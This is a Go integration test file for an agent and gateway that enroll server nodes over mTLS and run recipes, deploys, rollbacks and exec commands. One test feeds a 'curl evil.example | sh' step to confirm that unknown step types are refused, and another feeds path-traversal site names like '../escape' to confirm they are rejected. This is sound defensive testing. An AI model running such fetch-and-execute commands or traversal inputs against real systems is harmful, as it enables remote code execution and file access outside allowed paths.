// Package integration exercises the agent against the real gateway over TLS
// sockets.
//
// A node enrolls with a single-use token, connects over mTLS, receives a
// command, and reports a result. Everything below runs in one process but
// nothing is stubbed: the TLS handshake, the certificate issuance, the
// framing and the filesystem work are all production code paths.
//
// These used to run against internal/cpd, a reference server kept alongside
// the real one. Two implementations of the same protocol drift, and the
// enrollment encoding bug showed what that costs, so the reference server is
// gone and these run against the thing that ships.
package integration

import (
	"context"
	"crypto/tls"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log/slog"
	"net/http"
	"os"
	"path/filepath"
	"reflect"
	"runtime"
	"sort"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/unharbored/unharbored/internal/agentcore"
	"github.com/unharbored/unharbored/internal/commands"
	"github.com/unharbored/unharbored/internal/deploy"
	"github.com/unharbored/unharbored/internal/enroll"
	"github.com/unharbored/unharbored/internal/gateway"
	"github.com/unharbored/unharbored/internal/pki"
	"github.com/unharbored/unharbored/internal/protocol"
	"github.com/unharbored/unharbored/internal/recipe"
)

// harness is a running enrollment endpoint and gateway, plus the directories
// an agent needs.
type harness struct {
	gateway   *gateway.Server
	enroll    *enroll.Service
	ca        *pki.CA
	enrollURL string
	stateDir  string
	sitesRoot string
	events    *recordingEvents
	ctx       context.Context
}

// recordingEvents captures what the gateway reports, standing in for the
// control plane callbacks.
type recordingEvents struct {
	mu           sync.Mutex
	connected    []gateway.NodeEvent
	disconnected []gateway.NodeEvent
	progress     []gateway.ProgressEvent
}

func (r *recordingEvents) NodeConnected(_ context.Context, e gateway.NodeEvent) {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.connected = append(r.connected, e)
}

func (r *recordingEvents) NodeDisconnected(_ context.Context, e gateway.NodeEvent) {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.disconnected = append(r.disconnected, e)
}

func (r *recordingEvents) Progress(_ context.Context, e gateway.ProgressEvent) {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.progress = append(r.progress, e)
}

func (r *recordingEvents) Metrics(context.Context, gateway.MetricsEvent)   {}
func (r *recordingEvents) Logs(context.Context, gateway.LogsEvent)         {}
func (r *recordingEvents) Terminal(context.Context, gateway.TerminalEvent) {}

func (r *recordingEvents) connectedNodes() []gateway.NodeEvent {
	r.mu.Lock()
	defer r.mu.Unlock()
	return append([]gateway.NodeEvent(nil), r.connected...)
}

func (r *recordingEvents) progressFor(commandID string) []gateway.ProgressEvent {
	r.mu.Lock()
	defer r.mu.Unlock()
	var out []gateway.ProgressEvent
	for _, e := range r.progress {
		if commandID == "" || e.CommandID == commandID {
			out = append(out, e)
		}
	}
	return out
}

func quietLogger() *slog.Logger {
	return slog.New(slog.NewTextHandler(io.Discard, nil))
}

// newHarness stands up an enrollment endpoint and a gateway, both backed by
// one organisation CA, and returns the directories an agent needs.
//
// Deliberately the production types: pki.CA, enroll.Service and
// gateway.Server. The only thing standing in for the control plane is the
// event sink, because the thing under test is the agent and the gateway, not
// Laravel.
func newHarness(t *testing.T) *harness {
	t.Helper()

	ctx, cancel := context.WithCancel(context.Background())
	t.Cleanup(cancel)

	ca, err := pki.NewCA("org-test CA", pki.DefaultCAValidity)
	if err != nil {
		t.Fatalf("NewCA: %v", err)
	}

	serverCert, serverKey, err := ca.IssueServer("control-plane.local",
		[]string{"control-plane.local", "localhost"}, pki.DefaultNodeValidity)
	if err != nil {
		t.Fatalf("IssueServer: %v", err)
	}

	events := &recordingEvents{}

	registry := gateway.NewRegistry()
	if err := registry.Replace([]gateway.Organisation{
		{ID: "org-test", CACertificate: ca.Certificate()},
	}); err != nil {
		t.Fatalf("Replace: %v", err)
	}

	gw := gateway.NewServer(registry, gateway.Config{
		ServerCertPEM:    serverCert,
		ServerKeyPEM:     serverKey,
		HeartbeatSeconds: 1,
		Events:           events,
		Logger:           quietLogger(),
	})
	t.Cleanup(gw.Close)

	sessionAddr, err := gw.Listen(ctx, "127.0.0.1:0")
	if err != nil {
		t.Fatalf("gateway Listen: %v", err)
	}

	// Enrollment is an ordinary HTTPS endpoint, served here by the same
	// certificate the gateway presents. In production Laravel serves it
	// behind nginx; what matters to the agent is that it chains to the CA.
	enrollSvc := enroll.NewService(enroll.NewMemoryStore(), ca, sessionAddr)

	mux := http.NewServeMux()
	mux.HandleFunc("POST /enroll", func(w http.ResponseWriter, r *http.Request) {
		var req enroll.Request
		if err := json.NewDecoder(io.LimitReader(r.Body, 1<<20)).Decode(&req); err != nil {
			http.Error(w, "malformed", http.StatusBadRequest)
			return
		}

		resp, err := enrollSvc.Enroll(r.Context(), req)
		if err != nil {
			http.Error(w, "enrollment rejected", http.StatusForbidden)
			return
		}

		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(resp)
	})

	cert, err := tls.X509KeyPair(serverCert, serverKey)
	if err != nil {
		t.Fatalf("X509KeyPair: %v", err)
	}

	ln, err := tls.Listen("tcp", "127.0.0.1:0", &tls.Config{
		Certificates: []tls.Certificate{cert},
		MinVersion:   tls.VersionTLS13,
	})
	if err != nil {
		t.Fatalf("enrollment Listen: %v", err)
	}
	t.Cleanup(func() { _ = ln.Close() })

	httpSrv := &http.Server{Handler: mux, ReadHeaderTimeout: 5 * time.Second}
	go func() { _ = httpSrv.Serve(ln) }()
	t.Cleanup(func() { _ = httpSrv.Close() })

	base := t.TempDir()

	return &harness{
		gateway:   gw,
		enroll:    enrollSvc,
		ca:        ca,
		enrollURL: "https://" + ln.Addr().String() + "/enroll",
		stateDir:  filepath.Join(base, "state"),
		sitesRoot: filepath.Join(base, "sites"),
		events:    events,
		ctx:       ctx,
	}
}

// agentConfig builds an agent configuration pointed at the harness.
func (h *harness) agentConfig(token string) agentcore.Config {
	return agentcore.Config{
		StateDir:          h.stateDir,
		SitesRoot:         h.sitesRoot,
		EnrollURL:         h.enrollURL,
		EnrollToken:       token,
		BootstrapCAPEM:    h.ca.CertPEM(),
		ServerName:        "control-plane.local",
		HeartbeatInterval: 500 * time.Millisecond,
		Logger:            quietLogger(),
		DialTimeout:       5 * time.Second,
	}
}

// startAgent enrolls and connects an agent, waiting for the gateway to
// register it.
func (h *harness) startAgent(t *testing.T, nodeID string) *agentcore.Agent {
	t.Helper()

	token, err := h.enroll.Issue(h.ctx, nodeID, "org-test", time.Hour)
	if err != nil {
		t.Fatalf("Issue: %v", err)
	}

	agent := agentcore.New(h.agentConfig(token))
	if err := agent.EnsureEnrolled(h.ctx); err != nil {
		t.Fatalf("EnsureEnrolled: %v", err)
	}

	runCtx, cancel := context.WithCancel(h.ctx)
	t.Cleanup(cancel)

	go func() { _ = agent.Run(runCtx) }()

	h.waitConnected(t, nodeID)

	return agent
}

// waitConnected blocks until the gateway reports the node as connected.
func (h *harness) waitConnected(t *testing.T, nodeID string) {
	t.Helper()

	deadline := time.Now().Add(15 * time.Second)
	for time.Now().Before(deadline) {
		if h.gateway.IsConnected("org-test", nodeID) {
			return
		}
		time.Sleep(20 * time.Millisecond)
	}

	t.Fatalf("node %s did not connect within 15s", nodeID)
}

func (h *harness) send(t *testing.T, nodeID string, cmd protocol.Command) (*protocol.Result, []gateway.ProgressEvent) {
	t.Helper()

	ctx, cancel := context.WithTimeout(h.ctx, 30*time.Second)
	defer cancel()

	before := len(h.events.progressFor(""))

	res, err := h.gateway.Send(ctx, "org-test", nodeID, cmd)
	if err != nil {
		t.Fatalf("Send: %v", err)
	}

	all := h.events.progressFor("")

	return res, all[min(before, len(all)):]
}

func mustArgs(t *testing.T, v any) json.RawMessage {
	t.Helper()

	data, err := json.Marshal(v)
	if err != nil {
		t.Fatalf("marshal args: %v", err)
	}

	return data
}

// ---- the Phase 0 exit criterion ----

func TestEnrollConnectAndRunCommand(t *testing.T) {
	h := newHarness(t)
	h.startAgent(t, "node-1")

	nodes := h.gateway.Nodes("")
	if len(nodes) != 1 || nodes[0].NodeID != "node-1" {
		t.Fatalf("Nodes = %v, want one node-1", nodes)
	}

	// The gateway places a node by the CA that signed its certificate, not
	// by anything the node says about itself.
	if nodes[0].OrganizationID != "org-test" {
		t.Errorf("OrganizationID = %q, want org-test", nodes[0].OrganizationID)
	}

	// And the control plane must have been told.
	connected := h.events.connectedNodes()
	if len(connected) != 1 || connected[0].NodeID != "node-1" {
		t.Errorf("connect events = %v, want one for node-1", connected)
	}

	// Credentials must have landed on disk, and the certificate must carry
	// the identity the control plane assigned.
	state, err := agentcore.LoadState(h.stateDir)
	if err != nil {
		t.Fatalf("LoadState: %v", err)
	}
	if state.Identity.NodeID != "node-1" {
		t.Errorf("NodeID = %q, want node-1", state.Identity.NodeID)
	}
	if state.Identity.OrgID != "org-test" {
		t.Errorf("OrgID = %q, want org-test", state.Identity.OrgID)
	}
}

// The agent's private key must never be group or world readable.
func TestAgentKeyIsNotReadableByOthers(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("POSIX permission bits are not meaningful on Windows")
	}

	h := newHarness(t)
	h.startAgent(t, "node-1")

	info, err := os.Stat(filepath.Join(h.stateDir, "agent.key"))
	if err != nil {
		t.Fatalf("Stat: %v", err)
	}
	if perm := info.Mode().Perm(); perm&0o077 != 0 {
		t.Errorf("agent.key mode = %o, want no group or other access", perm)
	}
}

// A second start must reuse credentials rather than enrolling again, since
// the token is single use and would already be spent.
func TestAgentReusesCredentialsOnRestart(t *testing.T) {
	h := newHarness(t)
	h.startAgent(t, "node-1")

	before, err := os.ReadFile(filepath.Join(h.stateDir, "agent.crt"))
	if err != nil {
		t.Fatalf("ReadFile: %v", err)
	}

	// A fresh agent over the same state directory, with no token at all.
	cfg := h.agentConfig("")
	restarted := agentcore.New(cfg)
	if err := restarted.EnsureEnrolled(h.ctx); err != nil {
		t.Fatalf("EnsureEnrolled on restart: %v", err)
	}

	after, err := os.ReadFile(filepath.Join(h.stateDir, "agent.crt"))
	if err != nil {
		t.Fatalf("ReadFile: %v", err)
	}
	if string(before) != string(after) {
		t.Error("restart replaced the node certificate; it should have reused it")
	}
}

func TestEnrollmentFailsWithoutToken(t *testing.T) {
	h := newHarness(t)
	agent := agentcore.New(h.agentConfig(""))
	if err := agent.EnsureEnrolled(h.ctx); !errors.Is(err, agentcore.ErrNotEnrolled) {
		t.Fatalf("err = %v, want ErrNotEnrolled", err)
	}
}

func TestEnrollmentFailsWithSpentToken(t *testing.T) {
	h := newHarness(t)

	token, err := h.enroll.Issue(h.ctx, "node-1", "org-test", time.Hour)
	if err != nil {
		t.Fatalf("IssueToken: %v", err)
	}

	first := agentcore.New(h.agentConfig(token))
	if err := first.EnsureEnrolled(h.ctx); err != nil {
		t.Fatalf("first EnsureEnrolled: %v", err)
	}

	// A different node directory, same token.
	cfg := h.agentConfig(token)
	cfg.StateDir = filepath.Join(t.TempDir(), "second")
	second := agentcore.New(cfg)
	if err := second.EnsureEnrolled(h.ctx); err == nil {
		t.Fatal("a spent token enrolled a second node")
	}
}

// ---- recipes over the wire ----

func TestApplyRecipeConvergesNodeAndStreamsProgress(t *testing.T) {
	h := newHarness(t)
	h.startAgent(t, "node-1")

	target := filepath.Join(t.TempDir(), "etc", "app.conf")
	spec := recipe.Spec{Name: "site", Steps: []recipe.StepSpec{
		{ID: "dir", Type: recipe.TypeDir, Path: filepath.Dir(target), Mode: "0755"},
		{ID: "conf", Type: recipe.TypeFile, Path: target,
			ContentB64: recipe.EncodeContent([]byte("server {}\n")), Mode: "0644"},
	}}

	res, progress := h.send(t, "node-1", protocol.Command{
		Kind: protocol.CommandApplyRecipe,
		Args: mustArgs(t, commands.ApplyRecipe{Spec: spec}),
	})

	if res.Status != protocol.StatusSucceeded {
		t.Fatalf("status = %s, error = %s", res.Status, res.Error)
	}

	content, err := os.ReadFile(target)
	if err != nil {
		t.Fatalf("recipe did not create the file: %v", err)
	}
	if string(content) != "server {}\n" {
		t.Errorf("content = %q", content)
	}

	// Progress must stream per step, not arrive as one blob at the end.
	if len(progress) != 2 {
		t.Errorf("progress messages = %d, want 2", len(progress))
	}
	for i, p := range progress {
		if p.Seq != i {
			t.Errorf("progress[%d].Seq = %d, want %d", i, p.Seq, i)
		}
	}

	var detail commands.ApplyRecipeResult
	if err := json.Unmarshal(res.Detail, &detail); err != nil {
		t.Fatalf("decode detail: %v", err)
	}
	if detail.Run.Changed != 2 {
		t.Errorf("Changed = %d, want 2", detail.Run.Changed)
	}

	// Re-applying must be clean, which is what makes drift correction safe
	// to run on a schedule.
	res2, _ := h.send(t, "node-1", protocol.Command{
		Kind: protocol.CommandApplyRecipe,
		Args: mustArgs(t, commands.ApplyRecipe{Spec: spec}),
	})
	var detail2 commands.ApplyRecipeResult
	if err := json.Unmarshal(res2.Detail, &detail2); err != nil {
		t.Fatalf("decode detail: %v", err)
	}
	if detail2.Run.Changed != 0 {
		t.Errorf("second apply Changed = %d, want 0", detail2.Run.Changed)
	}
}

func TestApplyRecipeReportsFailure(t *testing.T) {
	h := newHarness(t)
	h.startAgent(t, "node-1")

	// A file step whose parent path is occupied by a file, which cannot work.
	blocker := filepath.Join(t.TempDir(), "blocker")
	if err := os.WriteFile(blocker, []byte("x"), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	res, _ := h.send(t, "node-1", protocol.Command{
		Kind: protocol.CommandApplyRecipe,
		Args: mustArgs(t, commands.ApplyRecipe{Spec: recipe.Spec{
			Name:  "bad",
			Steps: []recipe.StepSpec{{ID: "d", Type: recipe.TypeDir, Path: blocker}},
		}}),
	})

	if res.Status != protocol.StatusFailed {
		t.Fatalf("status = %s, want failed", res.Status)
	}
	if res.Error == "" {
		t.Error("failure carried no error message")
	}
}

// An unrecognised step type must be refused rather than executed.
func TestApplyRecipeRejectsUnknownStepType(t *testing.T) {
	h := newHarness(t)
	h.startAgent(t, "node-1")

	res, _ := h.send(t, "node-1", protocol.Command{
		Kind: protocol.CommandApplyRecipe,
		Args: mustArgs(t, commands.ApplyRecipe{Spec: recipe.Spec{
			Name:  "evil",
			Steps: []recipe.StepSpec{{ID: "x", Type: "shell", Name: "curl evil.example | sh"}},
		}}),
	})

	if res.Status != protocol.StatusFailed {
		t.Fatalf("status = %s, want failed", res.Status)
	}
	if !strings.Contains(res.Error, "unknown step type") {
		t.Errorf("error = %q, want it to name the unknown step type", res.Error)
	}
}

// ---- deploy lifecycle over the wire ----

func TestDeployActivateAndRollback(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("release activation needs symlinks; agents run on Linux")
	}

	h := newHarness(t)
	h.startAgent(t, "node-1")

	const site = "example.com"
	base := time.Now()
	v1 := deploy.NewReleaseID(base, "aaa1111")
	v2 := deploy.NewReleaseID(base.Add(time.Minute), "bbb2222")

	for _, id := range []string{v1, v2} {
		res, _ := h.send(t, "node-1", protocol.Command{
			Kind: protocol.CommandDeploy,
			Args: mustArgs(t, commands.PrepareRelease{Site: site, ReleaseID: id}),
		})
		if res.Status != protocol.StatusSucceeded {
			t.Fatalf("prepare %s: status = %s, error = %s", id, res.Status, res.Error)
		}
	}

	// Activate v1, then v2.
	for _, id := range []string{v1, v2} {
		res, _ := h.send(t, "node-1", protocol.Command{
			Kind: protocol.CommandActivateRelease,
			Args: mustArgs(t, commands.ActivateRelease{Site: site, ReleaseID: id}),
		})
		if res.Status != protocol.StatusSucceeded {
			t.Fatalf("activate %s: status = %s, error = %s", id, res.Status, res.Error)
		}
		var detail commands.ActivateReleaseResult
		if err := json.Unmarshal(res.Detail, &detail); err != nil {
			t.Fatalf("decode detail: %v", err)
		}
		if detail.Current != id {
			t.Errorf("Current = %q, want %q", detail.Current, id)
		}
	}

	// The current symlink on disk must agree.
	current, err := os.Readlink(filepath.Join(h.sitesRoot, site, "current"))
	if err != nil {
		t.Fatalf("Readlink: %v", err)
	}
	if filepath.Base(current) != v2 {
		t.Errorf("current -> %q, want %q", filepath.Base(current), v2)
	}

	// Rollback returns to v1.
	res, _ := h.send(t, "node-1", protocol.Command{
		Kind: protocol.CommandRollback,
		Args: mustArgs(t, commands.Rollback{Site: site}),
	})
	if res.Status != protocol.StatusSucceeded {
		t.Fatalf("rollback: status = %s, error = %s", res.Status, res.Error)
	}
	var rb commands.RollbackResult
	if err := json.Unmarshal(res.Detail, &rb); err != nil {
		t.Fatalf("decode detail: %v", err)
	}
	if rb.Current != v1 {
		t.Errorf("rolled back to %q, want %q", rb.Current, v1)
	}
}

// Pruning over the wire keeps the newest releases and never the live one or
// the rollback target, and the directories really go.
func TestPruneReleasesOverTheWire(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("release activation needs symlinks; agents run on Linux")
	}

	h := newHarness(t)
	h.startAgent(t, "node-1")

	const site = "example.com"
	base := time.Now()
	var ids []string
	for i := 0; i < 4; i++ {
		id := deploy.NewReleaseID(base.Add(time.Duration(i)*time.Minute), fmt.Sprintf("rel%d", i))
		ids = append(ids, id)
		for _, cmd := range []protocol.Command{
			{Kind: protocol.CommandDeploy, Args: mustArgs(t, commands.PrepareRelease{Site: site, ReleaseID: id})},
			{Kind: protocol.CommandActivateRelease, Args: mustArgs(t, commands.ActivateRelease{Site: site, ReleaseID: id})},
		} {
			if res, _ := h.send(t, "node-1", cmd); res.Status != protocol.StatusSucceeded {
				t.Fatalf("%s %s: %s", cmd.Kind, id, res.Error)
			}
		}
	}

	res, _ := h.send(t, "node-1", protocol.Command{
		Kind: protocol.CommandPruneReleases,
		Args: mustArgs(t, commands.PruneReleases{Site: site, Keep: 2}),
	})
	if res.Status != protocol.StatusSucceeded {
		t.Fatalf("prune: status = %s, error = %s", res.Status, res.Error)
	}
	var out commands.PruneReleasesResult
	if err := json.Unmarshal(res.Detail, &out); err != nil {
		t.Fatalf("decode detail: %v", err)
	}

	sort.Strings(out.Deleted)
	if want := ids[:2]; !reflect.DeepEqual(out.Deleted, want) {
		t.Errorf("deleted %v, want %v", out.Deleted, want)
	}
	for i, id := range ids {
		_, err := os.Stat(filepath.Join(h.sitesRoot, site, "releases", id))
		if gone := os.IsNotExist(err); gone != (i < 2) {
			t.Errorf("release %s: gone = %v, want %v", id, gone, i < 2)
		}
	}
}

// A site name is a path segment supplied by the control plane. A crafted one
// must not reach outside the sites root.
func TestSiteNameCannotEscapeSitesRoot(t *testing.T) {
	h := newHarness(t)
	h.startAgent(t, "node-1")

	for _, site := range []string{"../escape", "a/b", "..", "", `a\b`} {
		res, _ := h.send(t, "node-1", protocol.Command{
			Kind: protocol.CommandDeploy,
			Args: mustArgs(t, commands.PrepareRelease{
				Site:      site,
				ReleaseID: deploy.NewReleaseID(time.Now(), "aaa"),
			}),
		})
		if res.Status == protocol.StatusSucceeded {
			t.Errorf("site %q was accepted, want rejection", site)
		}
	}
}

// ---- exec allow list ----

// By default exec is unrestricted, because it is the customer's server and
// they already have root on it. An allow list restricted the owner and not an
// attacker: a recipe command step was never allow-listed, so a control plane
// wanting arbitrary execution would simply have sent one.
func TestExecIsUnrestrictedByDefault(t *testing.T) {
	h := newHarness(t)
	h.startAgent(t, "node-1")

	// A command that would have been refused by the old default list. It does
	// not need to exist; what matters is that the agent attempts it rather
	// than refusing on policy grounds.
	res, _ := h.send(t, "node-1", protocol.Command{
		Kind: protocol.CommandExec,
		Args: mustArgs(t, commands.Exec{Name: "some-tool-we-never-listed"}),
	})

	if strings.Contains(res.Error, "allow-listed") {
		t.Errorf("exec was refused on allow-list grounds by default: %q", res.Error)
	}
}

func TestExecRejectsEmptyCommand(t *testing.T) {
	h := newHarness(t)
	h.startAgent(t, "node-1")

	res, _ := h.send(t, "node-1", protocol.Command{
		Kind: protocol.CommandExec,
		Args: mustArgs(t, commands.Exec{Name: ""}),
	})

	if res.Status == protocol.StatusSucceeded {
		t.Error("an empty command succeeded")
	}
}

func TestExecRunsAllowListedCommand(t *testing.T) {
	// git is on the default allow list and is present in most environments.
	if _, err := os.Stat("/usr/bin/git"); err != nil {
		if runtime.GOOS == "windows" {
			t.Skip("no predictable allow-listed binary path on Windows")
		}
		t.Skip("git not available at /usr/bin/git")
	}

	h := newHarness(t)
	h.startAgent(t, "node-1")

	res, _ := h.send(t, "node-1", protocol.Command{
		Kind: protocol.CommandExec,
		Args: mustArgs(t, commands.Exec{Name: "git", Args: []string{"--version"}}),
	})
	if res.Status != protocol.StatusSucceeded {
		t.Fatalf("status = %s, error = %s", res.Status, res.Error)
	}

	var detail commands.ExecResult
	if err := json.Unmarshal(res.Detail, &detail); err != nil {
		t.Fatalf("decode detail: %v", err)
	}
	if !strings.Contains(detail.Output, "git version") {
		t.Errorf("output = %q, want it to contain the git version", detail.Output)
	}
}

// ---- protocol behaviour ----

func TestUnknownCommandIsReportedNotIgnored(t *testing.T) {
	h := newHarness(t)
	h.startAgent(t, "node-1")

	res, _ := h.send(t, "node-1", protocol.Command{Kind: "take_over_the_world"})
	if res.Status != protocol.StatusFailed {
		t.Fatalf("status = %s, want failed", res.Status)
	}
	if !strings.Contains(res.Error, "unsupported command") {
		t.Errorf("error = %q, want it to name the unsupported command", res.Error)
	}
}

// A command replayed after a reconnect must not run twice. Release
// activation and migrations are both unsafe to repeat.
func TestIdempotencyKeySuppressesDuplicateExecution(t *testing.T) {
	h := newHarness(t)
	h.startAgent(t, "node-1")

	marker := filepath.Join(t.TempDir(), "counter")
	spec := recipe.Spec{Name: "once", Steps: []recipe.StepSpec{
		{ID: "f", Type: recipe.TypeFile, Path: marker,
			ContentB64: recipe.EncodeContent([]byte("first\n"))},
	}}

	cmd := protocol.Command{
		Kind:           protocol.CommandApplyRecipe,
		Args:           mustArgs(t, commands.ApplyRecipe{Spec: spec}),
		IdempotencyKey: "deploy-42",
	}

	first, _ := h.send(t, "node-1", cmd)
	if first.Status != protocol.StatusSucceeded {
		t.Fatalf("first: status = %s, error = %s", first.Status, first.Error)
	}

	// Change the file out of band. If the replay really re-ran, it would be
	// put back.
	if err := os.WriteFile(marker, []byte("changed\n"), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	second, _ := h.send(t, "node-1", cmd)
	if second.Status != protocol.StatusSucceeded {
		t.Fatalf("second: status = %s, error = %s", second.Status, second.Error)
	}

	content, err := os.ReadFile(marker)
	if err != nil {
		t.Fatalf("ReadFile: %v", err)
	}
	if string(content) != "changed\n" {
		t.Errorf("replayed command re-executed; file = %q, want %q", content, "changed\n")
	}
}

func TestCommandToUnknownNodeFails(t *testing.T) {
	h := newHarness(t)
	h.startAgent(t, "node-1")

	ctx, cancel := context.WithTimeout(h.ctx, 5*time.Second)
	defer cancel()

	_, err := h.gateway.Send(ctx, "org-test", "node-does-not-exist", protocol.Command{Kind: protocol.CommandExec})
	if !errors.Is(err, gateway.ErrNodeNotConnected) {
		t.Fatalf("err = %v, want ErrNodeNotConnected", err)
	}
}

// Many commands in flight at once must each get their own correlated result.
func TestConcurrentCommandsAreCorrelatedIndependently(t *testing.T) {
	h := newHarness(t)
	h.startAgent(t, "node-1")

	dir := t.TempDir()
	const n = 12

	type outcome struct {
		idx int
		err error
	}
	done := make(chan outcome, n)

	for i := range n {
		go func() {
			path := filepath.Join(dir, fmt.Sprintf("file-%02d", i))
			spec := recipe.Spec{Name: "concurrent", Steps: []recipe.StepSpec{
				{ID: "f", Type: recipe.TypeFile, Path: path,
					ContentB64: recipe.EncodeContent([]byte(fmt.Sprintf("%d\n", i)))},
			}}

			ctx, cancel := context.WithTimeout(h.ctx, 30*time.Second)
			defer cancel()

			res, err := h.gateway.Send(ctx, "org-test", "node-1", protocol.Command{
				Kind: protocol.CommandApplyRecipe,
				Args: mustArgs(t, commands.ApplyRecipe{Spec: spec}),
			})
			if err != nil {
				done <- outcome{i, err}
				return
			}
			if res.Status != protocol.StatusSucceeded {
				done <- outcome{i, fmt.Errorf("status %s: %s", res.Status, res.Error)}
				return
			}
			done <- outcome{i, nil}
		}()
	}

	for range n {
		select {
		case o := <-done:
			if o.err != nil {
				t.Errorf("command %d: %v", o.idx, o.err)
			}
		case <-time.After(60 * time.Second):
			t.Fatal("timed out waiting for concurrent commands")
		}
	}

	// Every file must exist with its own content, proving results were not
	// crossed between commands.
	for i := range n {
		path := filepath.Join(dir, fmt.Sprintf("file-%02d", i))
		content, err := os.ReadFile(path)
		if err != nil {
			t.Errorf("file %d missing: %v", i, err)
			continue
		}
		if want := fmt.Sprintf("%d\n", i); string(content) != want {
			t.Errorf("file %d = %q, want %q", i, content, want)
		}
	}
}
